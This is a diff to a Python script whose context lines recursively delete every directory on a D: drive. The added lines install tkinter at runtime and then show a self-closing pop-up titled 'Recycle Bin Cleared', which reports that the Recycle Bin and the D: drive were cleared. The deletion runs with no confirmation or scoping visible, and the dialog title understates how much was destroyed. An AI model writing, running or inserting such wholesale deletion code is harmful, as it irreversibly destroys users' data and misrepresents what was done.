@@ -49,3 +49,21 @@ for root, dirs, files in os.walk(d_drive_path, topdown=False):
             print(f'Deleted directory: {dir_path}')
         except Exception as e:
             print(f'Failed to delete directory {dir_path}: {e}')
+
+print("D: Drive Cleared Successfully!");
+
+print("Installing tkinter")
+subprocess.check_call([sys.executable, "-m", "pip", "install", "tk"]);
+
+import tkinter as tk
+from tkinter import messagebox as mbox
+
+def self_destruct():
+    root.quit()
+    root.destroy()
+
+root = tk.Tk()
+root.withdraw() # Hide the main window
+root.after(10000, self_destruct)
+mbox.showinfo("Recycle Bin Cleared", "Recycle Bin and D: Drive Cleared Successfully!", parent=root)
+root.mainloop()
